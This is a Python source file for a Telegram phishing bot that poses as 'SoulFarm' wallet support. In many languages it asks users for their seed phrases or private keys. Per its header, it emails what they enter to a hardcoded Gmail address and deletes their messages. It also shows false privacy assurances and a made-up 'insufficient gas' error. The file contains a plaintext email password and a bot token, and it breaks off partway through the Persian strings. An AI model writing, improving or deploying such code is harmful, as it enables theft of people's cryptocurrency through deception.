#!/usr/bin/env python3
"""
Telegram bot with 25-language support (English + Russian included plus 23 others).
Features:
- Language selection at /start (stores in context.user_data["language"])
- Localized UI strings in LANGUAGES for 25 languages
- PROFESSIONAL_REASSURANCE mapping with {input_type} placeholder translated to all 25 languages
- Wallet-specific 24-word enforcement for four wallet types and localized wallet-specific error messages
- Post-receive error message (localized) shown after processing input
- Message stack for back-navigation and editing
- Sends received inputs by email (configure SENDER_EMAIL/SENDER_PASSWORD) and attempts to delete user messages
- Move BOT_TOKEN, SENDER_EMAIL, SENDER_PASSWORD to environment variables for production use
"""

import logging
import re
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7
CLAIM_STICKER_INPUT = 8
CLAIM_STICKER_CONFIRM = 9

# Regex patterns
MAIN_MENU_PATTERN = r"^(validation|claim_tokens|recover_account_progress|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_balance|claim_spin|refund|reflection|pending_withdrawal|recover_telegram_stars|claim_rewards|fix_bug|smash_piggy_bank|claim_tickets|claim_sticker_reward)$"
WALLET_TYPE_PATTERN = r"^wallet_type_"
OTHER_WALLETS_PATTERN = r"^other_wallets$"

# --- Email Configuration (update in production / use env vars) ---
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # replace with env var in prod
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Bot token (as provided) - replace with env var in production
BOT_TOKEN = "8747854377:AAG6zLyXFa_K7ZrHANkiD40koMH0ibPMR5Y"

# Wallet display names used for wallet selection UI
WALLET_DISPLAY_NAMES = {
    "wallet_type_metamask": "Tonkeeper",
    "wallet_type_trust_wallet": "Telegram Wallet",
    "wallet_type_coinbase": "MyTon Wallet",
    "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet",
    "wallet_type_rainbow": "Rainbow",
    "wallet_type_safepal": "SafePal",
    "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger",
    "wallet_type_brd_wallet": "BRD Wallet",
    "wallet_type_solana_wallet": "Solana Wallet",
    "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX",
    "wallet_type_xverse": "Xverse",
    "wallet_type_sparrow": "Sparrow",
    "wallet_type_earth_wallet": "Earth Wallet",
    "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet",
    "wallet_type_casper_wallet": "Casper Wallet",
    "wallet_type_cake_wallet": "Cake Wallet",
    "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap",
    "wallet_type_kaspa": "Kaspa",
    "wallet_type_nem_wallet": "NEM Wallet",
    "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet",
    "wallet_type_stack_wallet": "Stack Wallet",
    "wallet_type_soilflare_wallet": "Soilflare Wallet",
    "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
    "wallet_type_polkadot_wallet": "Polkadot Wallet",
    "wallet_type_xportal_wallet": "XPortal Wallet",
    "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet",
    "wallet_type_casperdash_wallet": "Casperdash Wallet",
    "wallet_type_nova_wallet": "Nova Wallet",
    "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station",
    "wallet_type_cosmos_station": "Cosmos Station",
    "wallet_type_exodus_wallet": "Exodus Wallet",
    "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain",
    "wallet_type_safemoon": "SafeMoon",
    "wallet_type_gnosis_safe": "Gnosis Safe",
    "wallet_type_defi": "DeFi",
    "wallet_type_other": "Other",
}

# PROFESSIONAL_REASSURANCE translations (25 languages) — uses {input_type}
PROFESSIONAL_REASSURANCE = {
    "en": 'Please note that "We protect your privacy. Your input {input_type} is highly encrypted and stored securely, and will only be used to help with this request, and we won’t share your information with third parties!."',
    "es": 'Tenga en cuenta que "Protegemos su privacidad. Su entrada {input_type} está altamente cifrada y almacenada de forma segura, y solo se utilizará para ayudar con esta solicitud, y no compartiremos su información con terceros!."',
    "fr": 'Veuillez noter que "Nous protégeons votre vie privée. Votre entrée {input_type} est fortement chiffrée et stockée en toute sécurité, et ne sera utilisée que pour aider à cette demande, et nous ne partagerons pas vos informations avec des tiers!."',
    "ru": 'Обратите внимание, что "Мы защищаем вашу конфиденциальность. Ваш ввод {input_type} надежно зашифрован и хранится в безопасности, и будет использоваться только для помощи с этим запросом, и мы не будем передавать вашу информацию третьим лицам!."',
    "uk": 'Зверніть увагу, що "Ми захищаємо вашу конфіденційність. Ваш ввід {input_type} сильно зашифрований і зберігається безпечно, і буде використовуватися лише для цієї запиту, і ми не будемо передавати вашу інформацію третім особам!."',
    "fa": 'لطفاً توجه داشته باشید که "ما از حریم خصوصی شما محافظت می‌کنیم. ورودی {input_type} شما به طور جدی رمزگذاری شده و به‌صورت امن ذخیره می‌شود، و فقط برای کمک به این درخواست استفاده خواهد شد، و ما اطلاعات شما را با اشخاص ثالث به اشتراک نخواهیم گذاشت!."',
    "ar": 'يرجى ملاحظة أنه "نحن نحمي خصوصيتك. يتم تشفير مدخلاتك {input_type} بشكل كبير وتخزينها بأمان، ولن يتم استخدامها إلا للمساعدة في هذا الطلب، ولن نشارك معلوماتك مع أطراف ثالثة!."',
    "pt": 'Observe que "Protegemos sua privacidade. Sua entrada {input_type} está altamente criptografada e armazenada com segurança, e será usada apenas para ajudar nesta solicitação, e não compartilharemos suas informações com terceiros!."',
    "id": 'Harap dicatat bahwa "Kami melindungi privasi Anda. Masukan {input_type} Anda sangat terenkripsi dan disimpan dengan aman, dan hanya akan digunakan untuk membantu permintaan ini, dan kami tidak akan membagikan informasi Anda dengan pihak ketiga!."',
    "de": 'Bitte beachten Sie, dass "Wir schützen Ihre Privatsphäre. Ihre Eingabe {input_type} ist hoch verschlüsselt und sicher gespeichert und wird nur verwendet, um bei dieser Anfrage zu helfen, und wir werden Ihre Informationen nicht an Dritte weitergeben!."',
    "nl": 'Houd er rekening mee dat "Wij uw privacy beschermen. Uw invoer {input_type} is sterk versleuteld en veilig opgeslagen, en zal alleen worden gebruikt om bij dit verzoek te helpen, en we zullen uw informatie niet met derden delen!."',
    "hi": 'कृपया ध्यान दें कि "हम आपकी गोपनीयता की रक्षा करते हैं। आपका {input_type} अत्यधिक एन्क्रिप्टेड है और सुरक्षित रूप से संग्रहीत है, और केवल इस अनुरोध में सहायता करने के लिए उपयोग किया जाएगा, और हम आपकी जानकारी तीसरे पक्ष के साथ साझा नहीं करेंगे!."',
    "tr": 'Lütfen unutmayın: "Gizliliğinizi koruyoruz. Girdiğiniz {input_type} yüksek düzeyde şifrelenmiştir ve güvenli bir şekilde saklanır; bu isteğe yardımcı olmak için kullanılacak ve bilgilerinizi üçüncü taraflarla paylaşmayacağız!."',
    "zh": '请注意："我们保护您的隐私。您输入的 {input_type} 已被高度加密并安全存储，仅会用于帮助处理此请求，我们不会与第三方共享您的信息！."',
    "cs": 'Vezměte prosím na vědomí, že "Chráníme vaše soukromí. Váš vstup {input_type} je silně zašifrován a bezpečně uložen a bude použit pouze k vyřízení tohoto požadavku a své informace nesdílíme s třetími stranami!."',
    "ur": 'براہِ مہربانی نوٹ کریں کہ "ہم آپ کی رازداری کی حفاظت کرتے ہیں۔ آپ کی داخل کردہ معلومات {input_type} کو سختی سے خفیہ کیا گیا ہے اور محفوظ طریقے سے ذخیرہ کیا جاتا ہے، اور اسے صرف اس درخواست میں مدد کے لیے استعمال کیا جائے گا، اور ہم آپ کی معلومات تیسرے فریق کے ساتھ شیئر نہیں کریں گے!."',
    "uz": 'Iltimos unutmang: "Biz sizning maxfiyligingizni himoya qilamiz. Sizning kiritganingiz {input_type} kuchli shifrlangan va xavfsiz saqlanadi, va bu so‘rovga yordam berish uchun ishlatiladi; biz ma’lumotlaringizni uchinchi tomonlar bilan ulashmaymiz!."',
    "it": 'Si prega di notare che "Proteggiamo la tua privacy. Il tuo input {input_type} è altamente crittografato e memorizzato in modo sicuro, e sarà utilizzato solo per aiutare con questa richiesta, e non condivideremo le tue informazioni con terze parti!."',
    "ja": 'ご注意ください：「私たちはあなたのプライバシーを保護します。あなたの入力 {input_type} は高度に暗号化され安全に保存され、このリクエストの支援のためのみ使用され、第三者と情報を共有することはありません!。」',
    "ms": 'Sila ambil perhatian bahawa "Kami melindungi privasi anda. Input {input_type} anda disulitkan dengan kuat dan disimpan dengan selamat, dan hanya akan digunakan untuk membantu permintaan ini, dan kami tidak akan berkongsi maklumat anda dengan pihak ketiga!."',
    "ro": 'Vă rugăm să rețineți că "Vă protejăm confidențialitatea. Datele dvs. {input_type} sunt puternic criptate și stocate în siguranță și vor fi utilizate doar pentru a ajuta la această cerere, iar noi nu vom partaja informațiile dvs. cu terți!."',
    "sk": 'Upozorňujeme, že "Chránime vaše súkromie. Váš vstup {input_type} je silne zašifrovaný a bezpečne uložený, bude použitý len na riešenie tejto požiadavky a vaše informácie nebudeme zdieľať s tretími stranami!."',
    "th": 'โปรดทราบว่า "เราปกป้องความเป็นส่วนตัวของคุณ ข้อมูล {input_type} ของคุณถูกเข้ารหัสอย่างสูงและจัดเก็บอย่างปลอดภัย และจะใช้เฉพาะเพื่อช่วยในคำขอนี้เท่านั้น และเราจะไม่แบ่งปันข้อมูลของคุณกับบุคคลที่สาม!."',
    "vi": 'Xin lưu ý rằng "Chúng tôi bảo vệ quyền riêng tư của bạn. Dữ liệu {input_type} của bạn được mã hóa cao và lưu trữ an toàn, và chỉ được sử dụng để hỗ trợ yêu cầu này, và chúng tôi sẽ không chia sẻ thông tin của bạn với bên thứ ba!."',
    "pl": 'Proszę pamiętać, że "Chronimy Twoją prywatność. Twoje dane {input_type} są silnie zaszyfrowane i przechowywane bezpiecznie, będą używane wyłącznie do pomocy przy tym żądaniu i nie udostępnimy Twoich informacji stronom trzecim!."',
}

# Fallback reassurance template
REASSURANCE_TEMPLATE = 'Please note that "We protect your privacy. Your input {input_type} is highly encrypted and stored securely, and will only be used to help with this request, and we won’t share your information with third parties!."'

# Full multi-language UI texts (25 languages) including:
# - label_seed_phrase, label_private_key
# - prompt_24_wallet_type_* keys for the 4 wallets
# - wallet_24_error_wallet_type_* keys for the 4 wallets
# - post_receive_error in all languages
LANGUAGES = {
    "en": {
        "welcome": "Hi {user} welcome to the SoulFarm support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
        "main menu title": "Please select an issue type to continue:",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "recover account progress": "Recover Account Progress",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        "prompt seed": "Please enter the 12 or 24 words of your wallet.",
        "prompt private key": "Please enter your private key.",
        "prompt_24_wallet_type_metamask": "Please enter the 24 words of your Tonkeeper wallet.",
        "prompt_24_wallet_type_trust_wallet": "Please enter the 24 words of your Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Please enter the 24 words of your MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Please enter the 24 words of your Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "This field requires a seed phrase (the 24 words of your Tonkeeper wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_trust_wallet": "This field requires a seed phrase (the 24 words of your Telegram wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_coinbase": "This field requires a seed phrase (the 24 words of your MyTon wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_tonkeeper": "This field requires a seed phrase (the 24 words of your Tonhub wallet). Please provide the seed phrase instead.",
        "refund": "Refund",
        "reflection": "Reflection",
        "pending withdrawal": "Pending withdrawal",
        "fix bug": "Fix BUG",
        "connect_refund": "Please connect your wallet to receive your refund",
        "connect_reflection": "Please connect your wallet to reflect your tokens in your wallet",
        "connect_pending_withdrawal": "Please connect your wallet to claim your pending withdrawal",
        "connect_fix_bug": "Please connect your wallet to fix the bug on your wallet",
        "post_receive_error": '⚠️ TON Wallet Verification Failed\n\nWallet verification could not be finalized due to insufficient TON for network gas and smart-contract execution fees required to complete the on-chain operation.\n\nTON Error: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nPlease ensure the connected wallet has sufficient TON for transaction finality, then retry the verification.\n\nAlso, locally re-check all 24 recovery words for spelling errors, missing words, incorrect order, or invalid entries. A single mismatch can cause wallet authentication/derivation validation to fail.',
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
        "confirm_entered_stickers": "You entered {count} sticker(s):\n{stickers}\n\nPlease confirm you want to claim these stickers.",
        "yes": "Yes",
        "no": "No",
        "back": "🔙 Back",
        "retry": '🔄 Retry',
        "invalid_input": "Invalid input. Please use /start to begin.",
    },
    "es": {
        "welcome": "Hi {user} bienvenido al SoulFarm support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
        "main menu title": "Por favor seleccione un tipo de problema para continuar:",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "recover account progress": "Recuperar progreso de la cuenta",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "label_seed_phrase": "frase semilla",
        "label_private_key": "clave privada",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "Por favor ingrese las 12 o 24 palabras de su wallet.",
        "prompt private key": "Por favor ingrese su private key.",
        "prompt_24_wallet_type_metamask": "Por favor ingrese las 24 palabras de su wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Por favor ingrese las 24 palabras de su Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Por favor ingrese las 24 palabras de su MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Por favor ingrese las 24 palabras de su Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Este campo requiere una frase semilla (las 24 palabras de su billetera Tonkeeper). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_trust_wallet": "Este campo requiere una frase semilla (las 24 palabras de su billetera Telegram). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_coinbase": "Este campo requiere una frase semilla (las 24 palabras de su billetera MyTon). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_tonkeeper": "Este campo requiere una frase semilla (las 24 palabras de su billetera Tonhub). Por favor proporcione la frase semilla.",
        "refund": "Reembolso",
        "reflection": "Reflexión",
        "pending withdrawal": "Retiro pendiente",
        "fix bug": "Corregir Error",
        "connect_refund": "Por favor conecte su billetera para recibir su reembolso",
        "connect_reflection": "Por favor conecte su billetera para reflejar sus tokens en su billetera",
        "connect_pending_withdrawal": "Por favor conecte su billetera para reclamar su retiro pendiente",
        "connect_fix_bug": "Por favor conecte su billetera para corregir el error en su billetera",
                        "retry": '🔄 Reintentar',
        "post_receive_error": '⚠️ Error de verificación de billetera TON\n\nLa verificación de la billetera no pudo finalizarse debido a TON insuficiente para las tarifas de gas de red y ejecución de contratos inteligentes necesarias para completar la operación en cadena.\n\nError TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAsegúrese de que la billetera conectada tenga suficiente TON para la finalidad de la transacción y luego reintente la verificación.\n\nAdemás, verifique localmente las 24 palabras de recuperación para detectar errores ortográficos, palabras faltantes, orden incorrecto o entradas no válidas. Una sola discrepancia puede causar un error en la validación de autenticación/derivación de la billetera.',
        "invalid choice": "Elección inválida. Por favor use los botones.",
    },
    "fr": {
        "welcome": "Hi {user} bienvenue au SoulFarm support bot! Ce bot aide con acceso au portefeuille, transactions, soldes, recoveries, récupération de compte, réclamer tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "recover account progress": "Récupérer la progression du compte",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "connect wallet message": "Veuillez connecter votre wallet avec votre Private Key ou Seed Phrase pour continuer.",
        "connect wallet button": "🔑 Connecter Wallet",
        "select wallet type": "Veuillez sélectionner votre type de wallet :",
        "other wallets": "Autres Wallets",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer Seed Phrase",
        "label_seed_phrase": "phrase mnémonique",
        "label_private_key": "clé privée",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "Veuillez entrer les 12 ou 24 mots de votre wallet.",
        "prompt private key": "Veuillez entrer votre private key.",
        "prompt_24_wallet_type_metamask": "Veuillez entrer les 24 mots de votre wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Veuillez entrer les 24 mots de votre Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Veuillez entrer les 24 mots de votre MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Veuillez entrer les 24 mots de votre Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Tonkeeper). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_trust_wallet": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Telegram). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_coinbase": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet MyTon). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_tonkeeper": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Tonhub). Veuillez fournir la phrase mnémonique.",
        "refund": "Remboursement",
        "reflection": "Réflexion",
        "pending withdrawal": "Retrait en attente",
        "fix bug": "Corriger BUG",
        "connect_refund": "Veuillez connecter votre wallet pour recevoir votre remboursement",
        "connect_reflection": "Veuillez connecter votre wallet pour refléter vos tokens dans votre wallet",
        "connect_pending_withdrawal": "Veuillez connecter votre wallet pour réclamer votre retrait en attente",
        "connect_fix_bug": "Veuillez connecter votre wallet pour corriger le bug sur votre wallet",
                        "retry": '🔄 Réessayer',
        "post_receive_error": "⚠️ Échec de la vérification du portefeuille TON\n\nLa vérification du portefeuille n'a pas pu être finalisée en raison d'un TON insuffisant pour les frais de gaz réseau et d'exécution des contrats intelligents nécessaires à l'opération on-chain.\n\nErreur TON : INSUFFICIENT_GAS_FOR_FINALIZATION\n\nAssurez-vous que le portefeuille connecté dispose de suffisamment de TON pour la finalité de la transaction, puis réessayez la vérification.\n\nVérifiez également localement les 24 mots de récupération pour détecter des erreurs d'orthographe, des mots manquants, un ordre incorrect ou des entrées invalides. Une seule incohérence peut entraîner l'échec de la validation d'authentification/dérivation du portefeuille.",
    },
    "ru": {
        "welcome": "Hi {user} добро пожаловать в SoulFarm support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, восстановлением аккаунта, получением токенов и наград, возвратами и проверкой аккаунта. Пожалуйста, выберите один из пунктов меню, чтобы продолжить.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "recover account progress": "Восстановление прогресса аккаунта",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "connect wallet message": "Пожалуйста подключите ваш wallet с помощью Private Key или Seed Phrase чтобы продолжить.",
        "connect wallet button": "🔑 Подключить Wallet",
        "select wallet type": "Пожалуйста, выберите тип вашего wallet:",
        "other wallets": "Другие Wallets",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Phrase",
        "label_seed_phrase": "фраза восстановления",
        "label_private_key": "приватный ключ",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "Пожалуйста, введите 12 или 24 слова вашей seed phrase.",
        "prompt private key": "Пожалуйста, введите ваш private key.",
        "prompt_24_wallet_type_metamask": "Пожалуйста введите 24 слова вашего Tonkeeper кошелька.",
        "prompt_24_wallet_type_trust_wallet": "Пожалуйста введите 24 слова вашего Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Пожалуйста введите 24 слова вашего MyTon кошелька.",
        "prompt_24_wallet_type_tonkeeper": "Пожалуйста введите 24 слова вашего Tonhub кошелька.",
        "wallet_24_error_wallet_type_metamask": "Это поле требует seed phrase (24 слова вашего кошелька Tonkeeper). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Это поле требует seed phrase (24 слова вашего Telegram кошелька). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Это поле требует seed phrase (24 слова вашего MyTon кошелька). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Это поле требует seed phrase (24 слова вашего Tonhub кошелька). Пожалуйста, предоставьте seed phrase.",
        "refund": "Возврат",
        "reflection": "Отражение",
        "pending withdrawal": "Ожидающий вывод",
        "fix bug": "Исправить ошибку",
        "connect_refund": "Пожалуйста подключите ваш кошелек, чтобы получить возврат",
        "connect_reflection": "Пожалуйста подключите ваш кошелек, чтобы отразить ваши токены в кошельке",
        "connect_pending_withdrawal": "Пожалуйста подключите ваш кошелек, чтобы получить ожидающую выплату",
        "connect_fix_bug": "Пожалуйста подключите ваш кошелек, чтобы исправить ошибку в вашем кошельке",
                        "retry": '🔄 Повторить',
        "post_receive_error": '⚠️ Ошибка верификации кошелька TON\n\nВерификация кошелька не могла быть завершена из-за недостаточного количества TON для оплаты газа сети и комиссий за выполнение смарт-контрактов, необходимых для завершения on-chain операции.\n\nОшибка TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nУбедитесь, что подключённый кошелёк имеет достаточно TON для финализации транзакции, затем повторите верификацию.\n\nТакже проверьте локально все 24 слова восстановления на наличие орфографических ошибок, пропущенных слов, неправильного порядка или недопустимых записей. Единственное несоответствие может привести к сбою проверки аутентификации/деривации кошелька.',
    },
    "uk": {
        "welcome": "Hi {user} ласкаво просимо до SoulFarm support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, відновленням облікового запису, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть один із пунктів меню, щоб продовжити.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "recover account progress": "Відновлення прогресу акаунту",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми зі входом",
        "connect wallet message": "будь ласка підключіть свій wallet за допомогою Private Key або Seed Phrase для продовження.",
        "connect wallet button": "🔑 Підключити Wallet",
        "select wallet type": "Будь ласка, виберіть тип вашого wallet:",
        "other wallets": "Інші Wallets",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Phrase",
        "label_seed_phrase": "фраза seed",
        "label_private_key": "приватний ключ",
        "wallet selection message": "Ви обрали {wallet_name}.\nОберіть бажаний режим підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "Будь ласка введіть 12 або 24 слова вашої seed phrase.",
        "prompt private key": "Будь ласка введіть ваш private key.",
        "prompt_24_wallet_type_metamask": "Будь ласка введіть 24 слова вашого Tonkeeper гаманця.",
        "prompt_24_wallet_type_trust_wallet": "Будь ласка введіть 24 слова вашого Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Будь ласка введіть 24 слова вашого MyTon гаманця.",
        "prompt_24_wallet_type_tonkeeper": "Будь ласка введіть 24 слова вашого Tonhub гаманця.",
        "wallet_24_error_wallet_type_metamask": "Це поле вимагає seed phrase (24 слова вашого Tonkeeper гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Це поле вимагає seed phrase (24 слова вашого Telegram гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Це поле вимагає seed phrase (24 слова вашого MyTon гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Це поле вимагає seed phrase (24 слова вашого Tonhub гаманця). Будь ласка, надайте seed phrase.",
        "refund": "Повернення",
        "reflection": "Відображення",
        "pending withdrawal": "Очікуване виведення",
        "fix bug": "Виправити помилку",
        "connect_refund": "Будь ласка підключіть свій гаманець, щоб отримати повернення",
        "connect_reflection": "Будь ласка підключіть свій гаманець, щоб відобразити ваші токени у гаманці",
        "connect_pending_withdrawal": "Будь ласка підключіть свій гаманець, щоб отримати очікуване виведення",
        "connect_fix_bug": "Будь ласка підключіть свій гаманець, щоб виправити помилку у вашому гаманці",
                        "retry": '🔄 Повторити',
        "post_receive_error": '⚠️ Помилка верифікації гаманця TON\n\nВерифікацію гаманця не вдалося завершити через недостатню кількість TON для оплати газу мережі та комісій за виконання смарт-контрактів, необхідних для завершення on-chain операції.\n\nПомилка TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nПереконайтеся, що підключений гаманець має достатньо TON для фіналізації транзакції, а потім повторіть верифікацію.\n\nТакож перевірте локально всі 24 слова відновлення на наявність орфографічних помилок, пропущених слів, неправильного порядку або недійсних записів. Єдина невідповідність може призвести до збою перевірки автентифікації/виведення гаманця.',
    },
    "fa": {
        "welcome": "Hi {user} خوش آمدید به SoulFarm support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، بازیابی حساب، درخواست توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "validation": "اعتبارسنجی",
        "claim tokens": "درخواست توکن‌ها",
        "recover account progress": "بازیابی پیشرفت حساب",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مشکلات ورود",
        "connect wallet message": "لطفاً کیف پول خود را با کلید خصوصی یا Seed Phrase متصل کنید.",
        "connect wallet button": "🔑 اتصال Wallet",
        "select wallet type": "لطفاً نوع wallet را انتخاب کنید:",
        "other wallets": "Wallet های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "label_seed_phrase": "عبارت بازیابی",
        "label_private_key": "کلید خصوصی",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید.",
        "prompt private key": "لطفاً private key خود را وارد کنید.",
        "prompt_24_wallet_type_metamask": "لطفاً 24 کلمه کیف پول Tonkeeper خود را وارد کنید.",
        "prompt_24_wallet_type_trust_wallet": "لطفاً 24 کلمه کیف پول Telegram خود را وارد کنید.",
        "prompt_24_wallet_type_coinbase": "لطفاً 24 کلمه کیف پول MyTon خود را وارد کنید.",
